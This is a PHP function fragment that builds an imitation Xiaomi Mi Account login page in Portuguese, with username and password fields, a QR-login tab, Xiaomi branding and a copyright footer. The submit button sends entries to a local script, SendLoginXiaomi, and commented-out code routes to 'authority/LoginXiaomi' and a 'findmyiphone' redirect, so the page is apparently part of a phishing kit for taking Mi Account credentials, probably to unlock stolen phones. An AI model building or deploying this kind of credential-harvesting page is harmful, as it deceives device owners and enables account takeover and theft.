	$html .= "\n" . '</div> ';
	$html .= "\n" . '<!-- header s -->';
	$html .= "\n" . '<div class="lgnheader">';
	$html .= "\n" . '<div class="header_tit t_c"> <em id="custom_display_1" class="milogo">                              <svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" rx="3" ry="3" style="fill:#ff6700"></rect><rect x="10" y="15" width="4.2" height="18" style="fill:#FFFFFF"></rect><rect x="33.75" y="15" width="4.2" height="18" style="fill:#FFFFFF"></rect><rect x="11.25" y="15" width="15" height="4.1" style="fill:#FFFFFF"></rect><rect x="26.2" y="20.55" width="4.2" height="12.5" style="fill:#FFFFFF"></rect><rect x="20.6" y="15" width="9.8" height="9.8" rx="4.4" ry="4.4" style="fill:#FFFFFF"></rect><rect x="20.2" y="19" width="6" height="6" rx="2" ry="2" style="fill:#ff6700"></rect><rect x="18" y="19.1" width="4" height="2.2" style="fill:#ff6700"></rect><rect x="24.2" y="23" width="1.94" height="10" style="fill:#ff6700"></rect><rect x="18.1" y="22.8" width="4.2" height="10.2" style="fill:#FFFFFF"></rect></svg>                            </em>';
	$html .= "\n" . '<h4 class="header_tit_txt" id="login-title">Faça o login em sua Conta Mi</h4>';
	$html .= "\n" . '<div class="site_info"></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<!-- header e -->';
	$html .= "\n" . '<!-- tab s -->';
	$html .= "\n" . '<div class="nav_tabs_panel">';
	$html .= "\n" . '<div id="nav-tabs" class="nav_tabs"> <a class="navtab-link now" href="javascript:void(0);" data-tab="pwd">Fazer login</a><span class="line"></span> <a class="navtab-link" href="javascript:void(0);" data-tab="qr">Ler código QR</a> </div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<!-- tab e -->';
	$html .= "\n" . '<!-- tab con s -->';
	//$html .= "\n" . '<form method="post" action="Login.php">';
	//$html .= form_open(site_url('authority/LoginXiaomi'), array('class' => 'cloud-login form-ajax-xiaomi', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n" ;
	$html .= "\n" . '<div class="tabs-con tabs_con now" data-con="pwd">';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<div class="login_area" id="login-main-form">';
	$html .= "\n" . '<div class="loginbox c_b">';
	$html .= "\n" . '<!-- 输入框 -->';
	$html .= "\n" . '<div class="lgn_inputbg c_b login-panel pwdLogin">';
	$html .= "\n" . '<!--验证用户名-->';
	$html .= "\n" . '<div class="single_imgarea" id="account-info">';
	$html .= "\n" . '<div class="na-img-area" id="account-avator" style="display:none">';
	$html .= "\n" . '<div class="na-img-bg-area" id="account-avator-con"></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<p class="us_name tac" id="account-displayname"></p>';
	$html .= "\n" . '<p class="us_id tac"></p>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<label id="region-code" class="labelbox login_user c_b" for="">';
	$html .= "\n" . '<div class="turn_area">';
	$html .= "\n" . '<a class="btn_turn" id="manual_code" href="javascript:void(0);" title="Ocultar código de país"></a>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div class="country_list">';
	$html .= "\n" . '<div class="animation countrycode_selector" id="countrycode_selector"> <span class="country_code"><tt class="countrycode-value" id="countrycode_value">+55</tt><i class="icon_arrow_down"></i></span> </div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<input class="item_account" autocomplete="off" type="text" name="user" id="username" placeholder="E-mail/Conta Mi" style="height: 48px;">';
	$html .= "\n" . '</label>';
	$html .= "\n" . '<input type="hidden" name="Sessao" value="<?php echo $Sessao; ?>" id="debug_log">';
	$html .= "\n" . '<input type="hidden" name="apple_add"  id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
	$html .= "\n" . '<div class="country-container" id="countrycode_container" style="display: none;">';
	$html .= "\n" . '<div class="country_container_con" id="countrycode_container_con"></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<label class="labelbox pwd_panel c_b">';
	$html .= "\n" . '<input class="item_account" type="password" placeholder="Senha" autocomplete="off" id="pwd" name="password" style="height: 48px;">';
	$html .= "\n" . '<div class="eye_panel pwd-visiable"> <i class="eye pwd-eye">                                          <svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg">                                            <path class="eye_outer" d="M0 8 C6 0,14 0,20 8, 14 16,6 16, 0 8 z"></path>                                            <circle class="eye_inner" cx="10" cy="8" r="3"></circle>                                          </svg>                                          </i> </div>';
	$html .= "\n" . '<div id="sms-code-panel" class="code_panel"> <a class="send_ticket" href="javascript:;" id="getSMSCode">Obter código de verificação</a> </div>';
	$html .= "\n" . '</label>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '<!-- 错误信息 -->';
	$html .= "\n" . '<div class="err_tip" style="display: none;">';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<em class="icon_error"></em>';
	$html .= "\n" . '<span class="error-con">The account ID or password you entered is incorrect.</span>';
	$html .= "\n" . '</div>                                  ';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div class="btns_bg">';
	$html .= "\n" . '<input class="btnadpt" id="login-button" type="submit" value="Fazer login" onclick="SendLoginXiaomi();"> <span id="custom_display_8" class="sns-default-container sns_default_container" style="display: none;">                                      </span> </div>';
	$html .= "\n" . '<div class="other_panel clearfix"> <span id="custom_display_256" class="sms_link">                                      <a href="javascript:;" class="btnadpt btn_gray login_type_link" id="ChangeLoginType" style="display: none;">Fazer login com SMS</a>                                    </span>';
	$html .= "\n" . '<div class="reverse" id="extra-links">';
	$html .= "\n" . '<div class="n_links_area reg_forget_links reg-forget-links" id="custom_display_64"> <a class="outer-link" href="#">Criar conta</a><span>|</span> <a class="outer-link" href="https://account.xiaomi.com/pass/forgetPassword?callback=https%3A%2F%2Fi.mi.com%2Fsts%3Fsign%3DmDx%252Bt1inmM%252B6ohLe6ny441ewNS0%253D%26followup%3Dhttps%253A%252F%252Fi.mi.com%252Fmobile%252Ffind%2523%252F%26sid%3Di.mi.com&amp;sid=i.mi.com&amp;_locale=pt_BR&amp;_snsNone=true">Esqueceu a senha?</a> </div>';
	$html .= "\n" . '<div class="n_links_area sms_unavaliable_links sms-unavaliable-links"><a target="_blank" href="https://static.account.xiaomi.com/html/faq/faqSMSerror.html">Não recebeu o código de verificação?</a></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<!-- 其他登录方式 s -->';
	$html .= "\n" . '';
	$html .= "\n" . '<!-- 其他登录方式 e -->';
	$html .= "\n" . '<p class="acq_tips" style="display: none;"></p>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	//$html .= "\n" . '</form>';
	$html .= "\n" . '<div class="tabs-con tabs_con" data-con="qr"> </div>';
	$html .= "\n" . '<!-- tab con e -->';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div class="ercode_area" id="login-qrcode">';
	$html .= "\n" . '<div class="ercode_pannel"> <a class="code_close" href="javascript:void(0)" title="Fechar" id="qrcode-close"><span class="icon_code_close"></span></a>';
	$html .= "\n" . '<div class="ercode_box">';
	$html .= "\n" . '<div class="code_hd">';
	$html .= "\n" . '<h3 class="code_tit">Leia o código QR para fazer o login</h3>';
	$html .= "\n" . '<p>Vá até Configurações &gt; Conta Mi em seu Mi Phone e toque no ícone do Leitor QR para fazer o login usando um código QR.</p>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div class="code_iframe">';
	$html .= "\n" . '<iframe style="background:#fff;" src="about:blank" id="qriframe" frameborder="0" scrolling="no" sandbox="allow-scripts allow-same-origin allow-top-navigation allow-modals"></iframe>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div class="custom_sub_txt">';
	$html .= "\n" . '<p id="custom-qr-name"></p>';
	$html .= "\n" . '<p>Vá até Configurações &gt; Conta Mi em seu Mi Phone para fazer o login usando um código QR</p>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div id="custom_display_4" class="n-footer">';
	$html .= "\n" . '<div class="nf-link-area clearfix">';
	$html .= "\n" . '<ul class="lang-select-list">';
	$html .= "\n" . '<li><a href="javascript:void(0)" class="current">English‎</a></li>';
	$html .= "\n" . '<li class="page-footer-list">';
	$html .= "\n" . '<button id="show-more-lang" class="show_more_lang show-more-lang">…</button>|</li>';
	$html .= "\n" . '<li><a href="#" target="_blank">FAQ</a>|</li>';
	$html .= "\n" . '<li><a id="msg-privacy" href="#" target="_blank">Privacy Policy</a></li>';
	$html .= "\n" . '</ul>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<p class="nf-intro">Xiaomi Inc., Xiaomi Inc., All rights reserved</p>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div id="cookie-usage-notify" class="cookie_usage_notify" style="display: none;"><i class="warning_white"></i>';
	$html .= "\n" . '<div class="text_content">';
	$html .= "\n" . '<p class="warning_text">Atenção</p>';
	$html .= "\n" . '<p>Este website usa cookies para armazenar informações no seu dispositivo. Os cookies ajudam o nosso site a funcionar normalmente e nos mostrar como podemos melhorar a sua experiência de usuário. Ao usar este website, você concorda com nossa política de cookies.</p>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<button class="close_cookie_usage close-cookie-usage"><i class="icon_close"></i><span class="btn-text">Aceitar</span></button>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div class="modal_container" style="display: none;">';
	$html .= "\n" . '<div class="modal_msk"></div>';
	$html .= "\n" . '<div class="modal_tip mod_acc_tip more-lang-modal" id="modal-id-0" style="display: none;">';
	$html .= "\n" . '<div class="modal_tip_flex">';
	$html .= "\n" . '<div class="modal_tip_hd modal-header">';
	$html .= "\n" . '<div class="external_logo_area">';
	$html .= "\n" . '<a class="milogo" href="javascript:void(0)"></a>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div class="modal-header-text modal_tip_title">Selecione o seu idioma</div><a href="javascript:void(0)" title="" class="modal-header-close btn_mod_close"><span>Fechar</span></a></div>';
	$html .= "\n" . '<div class="modal_tip_bd modal-body">';
	$html .= "\n" . '<div class="modal-select-list-con">';
	$html .= "\n" . '<ul class="lang-select-list lang_items_list c_b">';
	$html .= "\n" . '</ul>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '';
	$html .= "\n" . '<script src="/assets/js/ajax-form-xiaomi.js?t=' . time() . '"></script>';
	$html .= "\n" . '</body></html>';

	return $html;
}
}


?>
